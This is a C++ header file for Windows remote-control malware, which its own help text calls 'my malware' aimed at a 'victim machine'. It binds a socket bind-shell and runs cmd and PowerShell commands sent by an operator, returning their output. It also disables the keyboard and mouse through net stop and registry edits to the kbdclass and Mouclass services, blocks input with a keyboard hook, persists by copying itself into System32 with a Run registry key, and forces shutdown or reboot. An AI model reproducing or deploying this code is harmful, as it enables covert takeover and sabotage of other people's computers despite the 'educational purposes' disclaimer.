
#ifndef SOCKET_COM_COMMAND_H
#define SOCKET_COM_COMMAND_H


#include <iostream>
#include <string>
#include <cstring>
#include <cstdlib>
#include <windows.h>
#include <winsock2.h>
#include <thread>
#include <vector>
#include <algorithm>
#include <memory>
#include <stdexcept>
#include <ctime>
#include <random>
#include <sstream>
#include <setupapi.h>
#include <devguid.h>

#include "IO.h"


#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "ws2_32.lib") // Link with the Winsock library

namespace Socket_com_command
{
    LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
    HHOOK keyboardHook;
    std::string current_message = "\n";
    std::string executeShellCommand(const char* command);
    std::string runPowerShellCommand(const std::string& command);
    void DisableMouse ();
    void DisableKeyboard ();
    void EnableKeyboard();
    void EnableMouse();
    int enkeyboard();
    int enMouse();
    int disMouse();
    int diskeyboard();
    int persist();
    int shutdown_pc();
    int reboot_pc();
    int sleep_pc();
    std::vector<std::string> extractInput(const char* input) {
        std::vector<std::string> result;
        size_t spacePos = 0;
        for (size_t i = 0; input[i] != '\0'; ++i) {
            if (input[i] == ' ') {
                spacePos = i;
                break;
            }
        }
        if (spacePos != 0) {
            result.push_back(std::string(input, spacePos));
            result.push_back(std::string(input + spacePos + 1));
        } else {
            result.push_back(std::string(input));
            result.push_back("");
        }
        return result;
    }

    std::vector<int> clientSockets; // Stores client sockets

    void sendMessageToClients(const char* message) {
        for (int clientSocket : clientSockets) {
            send(clientSocket, message, strlen(message), 0);
        }
    }

    void writeLogToClients(const std::string message)
    {
        std::string M = "\n[" + Helper::DateTime().GetDateTimeString() + "]" + message + "\n";
        for (int clientSocket : clientSockets) {
            send(clientSocket, M.c_str(), strlen(M.c_str()), 0);
        }
    }
    void executeCommand(const char* command) {
        std::string result;

        // Execute the command and capture its output
        FILE* pipe = _popen(command, "r");
        if (pipe) {
            char buffer[128];
            while (!feof(pipe)) {
                if (fgets(buffer, 128, pipe) != NULL) {
                    result += buffer;
                }
            }
            _pclose(pipe);
        } else {
            result = "Failed to execute command.";
        }

        // Send the output of the command back to the client
        sendMessageToClients(result.c_str());
    }

    void handleClient(int clientSocket) {
        const char* stringbreak = "\n> ";
        clientSockets.push_back(clientSocket); // Add the client socket to the list
        const char* message ="   ___                                               _              _        _                    \n"
"  / __|    ___    _ __    _ __    __ _    _ _     __| |     o O O  | |      (_)    _ _      ___   \n"
" | (__    / _ \\  | '  \\  | '  \\  / _` |  | ' \\   / _` |    o       | |__    | |   | ' \\    / -_)  \n"
"  \\___|   \\___/  |_|_|_| |_|_|_| \\__,_|  |_||_|  \\__,_|   TS__[O]  |____|  _|_|_  |_||_|   \\___|  \n"
"_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"| {======|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"| \n"
"\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'./o--000'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\n";


        "Connection established. Happy Hacking :) \n";
        send(clientSocket, message, strlen(message), 0);

        while (true) {
        send(clientSocket, stringbreak, strlen(stringbreak), 0);
        char buffer[256];
        int bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0);
        if (bytesRead <= 0) {
            closesocket(clientSocket);
            clientSockets.erase(std::remove(clientSockets.begin(), clientSockets.end(), clientSocket), clientSockets.end());
            break;
        } else {
            buffer[bytesRead] = '\0';
            std::vector<std::string> commands = extractInput(buffer);
            std::string command = commands[0] ;
            std::string arguments =  commands[1] ;
            current_message = "\n";

            // Execute the received command as a shell command
            if (command == "cmd")
            {
                std::string commandResult = "\n[+] " + executeShellCommand(arguments.c_str()) +"\n";
                send(clientSocket, commandResult.c_str(), commandResult.length(), 0);
            }
            else if (command == "powershell")
            {
                std::string commandResult = "\n[+] " + executeShellCommand(arguments.c_str()) +"\n";
                send(clientSocket, commandResult.c_str(), commandResult.length(), 0);
            }
            else if (command == "disablekeyboard")
            {

                if(diskeyboard())
                {
                    current_message = "\nCould not disable keyboards check the privileges ";
                }

            }
            else if (command == "disablemouse")
            {
                if (disMouse())
                {
                    current_message = "\nCould not disable mice check the privileges ";
                }
            }
            else if (command == "enablemouse")
            {
                if(enMouse())
                {
                    current_message = "\nCould not enable mice check the privileges ";
                }
            }
            else if (command == "enablekeyboard")
            {
                if(enkeyboard())
                {
                    current_message = "\nCould not enable keyboard check the privileges ";
                }
            }
            else if (command == "disablemousereg")
            {
                DisableMouse();
                current_message = "\nMouse Disabled at next reboot";

            }
            else if (command == "disablekeyboardreg")
            {
                DisableKeyboard();
                current_message = "\nKeyboard Disabled at next reboot";
            }
            else if (command == "enablemousereg")
            {
                EnableMouse();
                current_message = "\nMouse Enabled at next reboot";
            }
            else if (command == "enablekeyboardreg")
            {
                EnableKeyboard();
                current_message = "\nKeyboard Enabled at next reboot";
            }
            else if (command == "blockkeyboard")
            {
                keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
                if (keyboardHook == NULL) {
                    current_message = "Failed to set up keyboard hook.\n";
                }
                current_message = "Input Blocked.\n";
            }
            else if (command == "unblockkeyboard")
            {
                UnhookWindowsHookEx(keyboardHook);
                current_message = "Input blocking disabled.\n" ;
            }
            else if (command == "persist")
            {
                if (!persist())
                    current_message = "\nPersistance applied now the program will run on startup";
                else
                    current_message = "\nPersistance failed";
            }
            else if (command == "sleep")
            {
                sleep_pc();
            }
            else if (command == "shutdown")
            {
                shutdown_pc();
            }
            else if (command == "reboot")
            {
                reboot_pc();
            }
            else if (command == "help")
            {

                current_message = "\nWelcome to the commandline part for my malware here are all the commands :\n"
                "cmd + [command] : executes a cmd command on the victim machine\n"
                "powershell + [command] : executes a powershell command on the victim machine\n"
                "disablekeyboard / disablemouse : disables the keyboard or mouse via the netstat\n"
                "enablekeyboard / enablemouse : enables the keyboard or mouse via the netstat\n"
                "blockkeyboard : disables all keyboard input and blocks it\n"
                "unblockkeyboard : re enables all keyboard input\n"
                "[Dangerous] enablekeyboardreg / enablemousereg : enables the keyboard or mouse via the regedit this can cause various problems\n"
                "[Dangerous] disablekeyboard / disablemouse : disables the keyboard or mouse via the regedit this can cause various problems\n"
                "persist : makes the malware persistant on the machine\n"
                "shutdown/reboot/sleep : self explainatory \n"
                "Note : This malware is only meant to be used for educational purposes only.\n";

            }
            else
            {
                current_message = "\nCommand unknown ! use help to list commands \n";
            }
            send(clientSocket, current_message.c_str(), current_message.length(), 0);
        }
    }
    }

    void listenForConnections(int serverSocket) {
        if (listen(serverSocket, 5) == -1) {
            IO::WriteLog("Error listening." );
            closesocket(serverSocket);
            WSACleanup();
            exit(1);
        }
        IO::WriteLog("Server listening..." );
        while (true) {
            sockaddr clientAddr;
            int clientAddrLen = sizeof(clientAddr);
            SOCKET clientSocket = accept(serverSocket, &clientAddr, &clientAddrLen);
            if (clientSocket == INVALID_SOCKET) {
                IO::WriteLog("Error accepting client connection." );
                continue;
            }

            std::thread clientThread(handleClient, clientSocket);
            clientThread.detach();
        }
    }

    SOCKET createServerSocket(int port) {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            IO::WriteLog("Error initializing Winsock." );
            exit(1);
        }

        SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (serverSocket == INVALID_SOCKET) {
            IO::WriteLog("Error creating socket." );
            WSACleanup();
            exit(1);
        }

        sockaddr_in serverAddr;
        memset(&serverAddr, 0, sizeof(serverAddr));
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = INADDR_ANY;
        serverAddr.sin_port = htons(port);

        if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            IO::WriteLog("Error binding socket." );
            closesocket(serverSocket);
            WSACleanup();
            exit(1);
        }

        return serverSocket;
    }

    int runServer(int port) {
        SOCKET serverSocket = createServerSocket(port);
        std::thread serverThread(listenForConnections, serverSocket);
        serverThread.detach();
        return serverSocket;
    }

    std::string runPowerShellCommand(const std::string& command) {
        std::string result;
        HANDLE g_hChildStd_OUT_Rd = NULL;
        HANDLE g_hChildStd_OUT_Wr = NULL;

        SECURITY_ATTRIBUTES saAttr;
        saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
        saAttr.bInheritHandle = TRUE;
        saAttr.lpSecurityDescriptor = NULL;

        if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0)) {
            return "Error creating pipe.";
        }

        STARTUPINFOA siStartInfo;
        PROCESS_INFORMATION piProcInfo;

        ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
        ZeroMemory(&siStartInfo, sizeof(STARTUPINFOA));

        siStartInfo.cb = sizeof(STARTUPINFOA);
        siStartInfo.hStdError = g_hChildStd_OUT_Wr;
        siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
        siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

        std::string fullCommand = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"" + std::string(command) + "\"";

        if (!CreateProcessA(NULL, (LPSTR)fullCommand.c_str(), NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &piProcInfo)) {
            return "Error creating process.";
        }

        CloseHandle(g_hChildStd_OUT_Wr);

        CHAR chBuf[4096];
        DWORD dwRead;

        while (true) {
            if (!ReadFile(g_hChildStd_OUT_Rd, chBuf, sizeof(chBuf), &dwRead, NULL) || dwRead == 0) {
                break;
            }
            chBuf[dwRead] = '\0';
            result += chBuf;
        }

        CloseHandle(g_hChildStd_OUT_Rd);

        WaitForSingleObject(piProcInfo.hProcess, INFINITE);
        CloseHandle(piProcInfo.hProcess);
        CloseHandle(piProcInfo.hThread);

        return result;
    }

    std::string executeShellCommand(const char* command) {
        std::array<char, 128> buffer;
        std::string result;
        // Open the command as a process and capture its output
        FILE* pipe = _popen(command, "r");
        if (!pipe) {
            return "Error opening pipe.";
        }
        while (!feof(pipe)) {
            if (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
                result += buffer.data();
            }
        }
        _pclose(pipe);
        return result;
    }


    void DisableMouse ()
    {
        std::string key = "HKEY_LOCAL_MACHINE\\system\\CurrentControlSet\\Services\\Mouclass";

        // Delete the Registry key
        std::string deleteKeyCommand = "reg delete \"" + key + "\" /f";
        system(deleteKeyCommand.c_str());

        // Add the "Start" value to the Registry key
        std::string addStartValueCommand = "reg add \"" + key + "\" /v Start /t REG_DWORD /d 4";
        system(addStartValueCommand.c_str());
    }
    void EnableMouse ()
    {
        std::string key = "HKEY_LOCAL_MACHINE\\system\\CurrentControlSet\\Services\\Mouclass";

        // Add the "Start" value with data 1 to the Registry key
        std::string addStartValueCommand = "reg add \"" + key + "\" /v Start /t REG_DWORD /d 1";
        system(addStartValueCommand.c_str());
    }
    void DisableKeyboard ()
    {
        std::string key = "HKEY_LOCAL_MACHINE\\system\\CurrentControlSet\\Services\\kbdclass";

        // Delete the Registry key
        std::string deleteKeyCommand = "reg delete \"" + key + "\" /f";
        system(deleteKeyCommand.c_str());

        // Add the "Start" value to the Registry key
        std::string addStartValueCommand = "reg add \"" + key + "\" /v Start /t REG_DWORD /d 4";
        system(addStartValueCommand.c_str());
    }
    void EnableKeyboard ()
    {
        std::string key = "HKEY_LOCAL_MACHINE\\system\\CurrentControlSet\\Services\\kbdclass";

        // Add the "Start" value with data 1 to the Registry key
        std::string addStartValueCommand = "reg add \"" + key + "\" /v Start /t REG_DWORD /d 1";
        system(addStartValueCommand.c_str());
    }
    std::string GenerateRandomName() {
        std::default_random_engine generator(static_cast<unsigned int>(time(nullptr)));
        std::uniform_int_distribution<int> distribution(0, 15);

        std::stringstream ss;
        for (int i = 0; i < 16; ++i) {
            ss << std::hex << distribution(generator);
        }

        ss << ".exe";
        return ss.str();
    }

    int persist()
    {
        std::string randomName = GenerateRandomName();
        char executablePath[MAX_PATH];
        GetModuleFileName(NULL, executablePath, MAX_PATH);
        std::string destinationPath = "C:\\Windows\\System32\\" + randomName;

        if (CopyFile(executablePath, destinationPath.c_str(), FALSE)) {
            HKEY hKey;
            if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
                RegSetValueEx(hKey, randomName.c_str(), 0, REG_SZ, (BYTE*)destinationPath.c_str(), destinationPath.size() + 1);
                RegCloseKey(hKey);
            } else {
                return 1;
            }
        } else {
            return 1;
        }

        return 0;
    }
    int disMouse()
    {
        std::string stopServiceCommand = "net stop mouclass";
        if (system(stopServiceCommand.c_str()) == 0) {
            current_message= "Mouse device stopped successfully.\n";
        } else {
            current_message= "Failed to stop the mouse device.\n";
        }

        return 0;
    }
    int enMouse()
    {
        std::string stopServiceCommand = "net start mouclass";
        if (system(stopServiceCommand.c_str()) == 0) {
            current_message= "Mouse device stopped successfully.\n";
        } else {
            current_message= "Failed to stop the mouse device.\n" ;
        }

        return 0;
    }
    int diskeyboard()
    {
        // Stop the keyboard class driver service
        std::string stopServiceCommand = "net stop kbdclass";
        if (system(stopServiceCommand.c_str()) == 0) {
            current_message= "Keyboard device stopped successfully.\n";
        } else {
            current_message= "Failed to stop the keyboard device.\n";
        }

        return 0;
    }
    int enkeyboard ()
    {
        std::string startServiceCommand = "net start kbdclass";
        if (system(startServiceCommand.c_str()) == 0) {
            current_message= "Keyboard device started successfully. \n";
        } else {
            current_message = "Failed to start the keyboard device. \n";
        }

        return 0;
    }
    LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0) {
            return 1;
        }
        return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
    }
    int reboot_pc()
    {
        if (system("shutdown /r /f /t 0")) {
        current_message="Rebooting the computer...\n";
        } else {
            current_message="Failed to reboot the computer.\n";
        }

        return 0;
    }
    int shutdown_pc()
    {
        if (system("shutdown /s /f /t 0")) {
        current_message="Shutting down the computer...\n";
        } else {
            current_message= "Failed to shut down the computer.\n";
        }

        return 0;
    }
    int sleep_pc()
    {
        if (system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")) {
        current_message="Putting the computer to sleep...\n";
        } else {
            current_message="Failed to put the computer to sleep.\n";
        }
        return 0;
    }
}


#endif // SOCKET_COM_COMMAND_H
